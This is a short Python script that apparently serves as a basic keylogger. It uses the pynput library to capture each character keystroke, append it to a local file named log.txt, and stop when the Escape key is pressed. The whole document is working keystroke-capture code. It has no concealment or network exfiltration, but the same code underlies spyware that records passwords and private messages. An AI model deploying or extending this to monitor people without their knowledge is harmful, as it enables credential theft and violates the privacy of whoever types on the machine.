import os
import sys
import time
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open('log.txt', 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        pass

def on_release(key):
    print('{0} release'.format(key))
    if key == Key.esc:
        # Stop listener
        sys.exit()

# Collect events until released
if __name__ == '__main__':
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

